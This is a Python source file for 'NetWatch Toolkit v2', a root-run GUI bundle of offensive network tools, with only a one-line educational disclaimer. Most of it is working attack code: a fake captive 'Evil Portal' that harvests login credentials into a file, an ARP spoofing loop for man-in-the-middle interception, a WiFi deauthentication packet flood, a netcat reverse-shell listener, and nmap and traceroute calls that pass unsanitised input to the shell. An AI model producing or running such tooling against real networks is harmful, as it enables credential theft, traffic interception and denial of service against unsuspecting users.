#!/usr/bin/env python3
"""
NetWatch Toolkit v2
Author: Niko DeRuise

USAGE:
sudo python3 netwatchV2.py

REQUIREMENTS:
- Python 3.x
- scapy
- nmap
- tkinter
- hostapd, dnsmasq
- netcat (nc)

DISCLAIMER:
For authorized educational use only.
"""

import os
import socket
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from tkinter import *
from tkinter import ttk, filedialog, messagebox
from scapy.all import ARP, Ether, srp, send, RadioTap, Dot11, Dot11Deauth, sendp

# === Globals ===
evil_dir = "netwatch_portal"
os.makedirs(evil_dir, exist_ok=True)
evil_processes = []
portal_server = None

# === Evil Portal Server ===
class PortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = os.path.join(evil_dir, "index.html")
        try:
            with open(path, "rb") as f:
                html = f.read()
        except:
            html = b"<form method='POST' action='/creds'><input name='user'><input name='pass'><input type='submit'></form>"
        self.send_response(200)
        self.end_headers()
        self.wfile.write(html)

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length).decode()
        creds = parse_qs(data)
        with open(os.path.join(evil_dir, "credentials.txt"), "a") as f:
            f.write(f"{self.client_address[0]} - {creds}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h1>Connection Failed</h1>")

def start_portal_server():
    global portal_server
    os.chdir(evil_dir)
    portal_server = HTTPServer(('0.0.0.0', 8080), PortalHandler)
    portal_server.serve_forever()

def stop_portal_server():
    global portal_server
    if portal_server:
        portal_server.shutdown()
        portal_server = None

# === GUI Setup ===
if os.geteuid() != 0:
    print("[!] Run this script as root.")
    exit()

root = Tk()
root.title("NetWatch Toolkit v2")
root.geometry("950x700")
style = ttk.Style()
style.theme_use("clam")
style.configure("TNotebook.Tab", background="#222", foreground="#0ff", padding=10)
style.map("TNotebook.Tab", background=[("selected", "#0ff")])
notebook = ttk.Notebook(root)
notebook.pack(expand=1, fill='both')

# === Nmap ===
tab1 = Frame(notebook, bg="#1e1e2e")
notebook.add(tab1, text="Nmap Scanner")
Label(tab1, text="Target IP/Range:", bg="#1e1e2e", fg="#0ff").pack()
nmap_target = Entry(tab1, width=40)
nmap_target.pack()
nmap_output = Text(tab1, bg="black", fg="lime")
nmap_output.pack(expand=1, fill="both")
def run_nmap():
    t = nmap_target.get()
    if not t: return
    result = subprocess.getoutput(f"nmap -sS -Pn {t}")
    nmap_output.delete(1.0, END)
    nmap_output.insert(END, result)
Button(tab1, text="Run Nmap", command=run_nmap).pack()

# === ARP Scan ===
tab2 = Frame(notebook, bg="#1e1e2e")
notebook.add(tab2, text="ARP Scan")
Label(tab2, text="Network (CIDR):", bg="#1e1e2e", fg="#0ff").pack()
arp_range = Entry(tab2, width=40)
arp_range.pack()
arp_output = Text(tab2, bg="black", fg="lime")
arp_output.pack(expand=1, fill="both")
def scan_arp():
    ip_range = arp_range.get()
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range)
    ans, _ = srp(pkt, timeout=2, verbose=0)
    arp_output.delete(1.0, END)
    for _, rcv in ans:
        arp_output.insert(END, f"{rcv.psrc} - {rcv.hwsrc}\n")
Button(tab2, text="Start ARP Scan", command=scan_arp).pack()

# === ARP Spoofing ===
tab3 = Frame(notebook, bg="#1e1e2e")
notebook.add(tab3, text="ARP Spoof")
Label(tab3, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
target_entry = Entry(tab3)
target_entry.pack()
Label(tab3, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
gateway_entry = Entry(tab3)
gateway_entry.pack()

spoofing = False
def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    for _, r in ans:
        return r[Ether].src
    return None

def start_spoof():
    global spoofing
    spoofing = True
    tgt = target_entry.get()
    gw = gateway_entry.get()
    def spoof_loop():
        target_mac = get_mac(tgt)
        gw_mac = get_mac(gw)
        while spoofing:
            send(ARP(op=2, pdst=tgt, psrc=gw, hwdst=target_mac), verbose=0)
            send(ARP(op=2, pdst=gw, psrc=tgt, hwdst=gw_mac), verbose=0)
            time.sleep(2)
    threading.Thread(target=spoof_loop, daemon=True).start()

def stop_spoof():
    global spoofing
    spoofing = False

Button(tab3, text="Start Spoof", command=start_spoof).pack()
Button(tab3, text="Stop Spoof", command=stop_spoof).pack()

# === Traceroute ===
tab4 = Frame(notebook, bg="#1e1e2e")
notebook.add(tab4, text="Traceroute")
Label(tab4, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
trace_entry = Entry(tab4)
trace_entry.pack()
trace_output = Text(tab4, bg="black", fg="lime")
trace_output.pack(expand=1, fill="both")
Button(tab4, text="Run Traceroute", command=lambda: trace_output.insert(END, subprocess.getoutput(f"traceroute {trace_entry.get()}"))).pack()

# === Reverse Shell ===
tab5 = Frame(notebook, bg="#1e1e2e")
notebook.add(tab5, text="Reverse Shell")
Label(tab5, text="LHOST (your IP):", bg="#1e1e2e", fg="#0ff").pack()
lhost = Entry(tab5)
lhost.pack()
Label(tab5, text="LPORT:", bg="#1e1e2e", fg="#0ff").pack()
lport = Entry(tab5)
lport.insert(0, "4444")
lport.pack()
def start_listener():
    ip = lhost.get()
    port = lport.get()
    subprocess.Popen(["gnome-terminal", "--", "nc", "-lvnp", port])
Button(tab5, text="Start Listener", command=start_listener).pack()

# === Evil Portal ===
tab6 = Frame(notebook, bg="#1e1e2e")
notebook.add(tab6, text="Evil Portal")
Label(tab6, text="Choose Custom HTML Page:", bg="#1e1e2e", fg="#0ff").pack()
def choose_html():
    path = filedialog.askopenfilename(filetypes=[("HTML files", "*.html")])
    if path:
        with open(path, "r") as src, open(os.path.join(evil_dir, "index.html"), "w") as dst:
            dst.write(src.read())
Button(tab6, text="Select HTML File", command=choose_html).pack()

def start_evil():
    threading.Thread(target=start_portal_server, daemon=True).start()
    messagebox.showinfo("Portal", "Evil Portal started on port 8080")
def stop_evil():
    stop_portal_server()
    messagebox.showinfo("Portal", "Stopped. iptables should be cleaned manually.")
Button(tab6, text="Start Evil Portal", command=start_evil).pack()
Button(tab6, text="Stop Evil Portal", command=stop_evil).pack()

def show_creds():
    try:
        with open(os.path.join(evil_dir, "credentials.txt"), "r") as f:
            data = f.read()
        messagebox.showinfo("Captured Credentials", data)
    except:
        messagebox.showwarning("No Data", "No credentials captured yet.")
Button(tab6, text="View Captured Creds", command=show_creds).pack()

# === Deauth ===
tab7 = Frame(notebook, bg="#1e1e2e")
notebook.add(tab7, text="Deauth Attack ⚠️")
Label(tab7, text="Monitor Interface (e.g., wlan0mon):", bg="#1e1e2e", fg="#0ff").pack()
iface_entry = Entry(tab7)
iface_entry.pack()
Label(tab7, text="Target MAC:", bg="#1e1e2e", fg="#0ff").pack()
target_mac_entry = Entry(tab7)
target_mac_entry.pack()
Label(tab7, text="AP MAC:", bg="#1e1e2e", fg="#0ff").pack()
ap_mac_entry = Entry(tab7)
ap_mac_entry.pack()
Label(tab7, text="# of packets:", bg="#1e1e2e", fg="#0ff").pack()
num_packets_entry = Entry(tab7)
num_packets_entry.insert(0, "100")
num_packets_entry.pack()
def send_deauth():
    iface = iface_entry.get()
    target = target_mac_entry.get()
    ap = ap_mac_entry.get()
    count = int(num_packets_entry.get())
    pkt = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth()
    sendp(pkt, iface=iface, count=count, inter=0.1, verbose=1)
Button(tab7, text="Send Deauth Packets", command=send_deauth).pack(pady=10)

# === Reset / Info ===
tab8 = Frame(notebook, bg="#1e1e2e")
notebook.add(tab8, text="Reset")
def reset_all():
    for w in root.winfo_children():
        for child in w.winfo_children():
            if isinstance(child, Entry):
                child.delete(0, END)
Button(tab8, text="Reset All Fields", command=reset_all).pack()

root.mainloop()